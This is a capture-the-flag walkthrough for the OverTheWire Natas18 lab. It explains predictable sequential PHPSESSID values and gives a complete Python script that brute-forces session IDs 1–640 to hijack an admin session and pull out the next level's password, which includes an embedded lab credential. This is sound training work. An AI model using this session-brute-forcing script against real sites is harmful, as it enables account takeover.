# 🔐 Natas18 Walkthrough
In this level, we're asked to log in as an admin user. When we look at the [view sourcecode]() we quickly see that there isn't an sql injection vunerability like the previous levels. Instead, the vunerability lies in ***session management.***

## 🔍 What is session management?
Http sites are stateless, meaning that each user gets their own session. Here we "simply" need to get access to the admin's session via ***PHPSESSID***. When we log in with arbitrary credentials, the site sets a ***PHPSESSID*** cookie. By experimenting, we can see that: 

- Each login attempt generates a numeric PHPSESSID stored in the storage tab in the developer tools.
- These IDs are assigned sequentially (1, 2, 3, ...).
- The application store wheter a session belong to `admin` or another user, **based solely on the PHPSESSID value.**

```php
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
```

This means we can brute-forfce possible PHPSESSID values until we find one that belongs to an **admin's** session.

## 🛠️ Attack stategy

The sourcecode hints the maximum value of the ***PHPSESSID***:

```php
$maxid = 640; // 640 should be enough for everyone
```

1. Loop over all possible PHP SESSID values (1-640). 
2. For each one, send a request with that sessiod ID in the cookie.
3. Check the response - if it contains `"You are an admin"` - (via the sourcode aswell), then we've found the correct PHPSESSID.
4. The password for natas19 should be displayed on the page after you connect to an admin's session so we'll extract it from the website automatically too.

## 🤖 The script

Here's the script to brute-force the session IDs:

```python
import requests, re, time, sys

# =======================
# === STYLING HELPERS ===
# =======================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def log_info(message):
    print(f"{CYAN}[*] {message}{RESET}")

def log_success(message):
    print(f"{GREEN}[+] {message}{RESET}")


def log_progress_inline(message, color=CYAN):
    sys.stdout.write(f"\r{YELLOW}{message}{RESET}")
    sys.stdout.flush()

def log_found_inline(message):
    sys.stdout.write(f"\r{YELLOW}{message}{RESET}\n")
    sys.stdout.flush()


# =======================

# === CONFIG ===
url = "http://natas18.natas.labs.overthewire.org/"
username = "natas18"
natas18_password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
phpsesidMax = 640
phpsesidMin = 1
# =============

log_info("Starting brute-force on natas18...")

for sesID in range(phpsesidMin, phpsesidMax + 1):
    # Show inline progress
    log_progress_inline(f"Trying PHPSESSID={sesID}")

    cookies = {"PHPSESSID": str(sesID)}
    response = requests.get(url, cookies=cookies, auth=(username, natas18_password))

    if "You are an admin" in response.text:
        # Extract password
        match = re.search(r"Password:\s*(\S+)", response.text)
        if match:
            password = match.group(1)
            log_found_inline(f"Admin session found! PHPSESSID={sesID}")
            log_success(f"Natas19 password: {password}")
            break
```

The script cycles through all possible PHPSESSID values (1-640). Once it finds the admin session, the servers responds with:
```
You are an admin. The password for natas19 is: <PASSWORD>
```

Copy the console output and let's get to the next level. (:
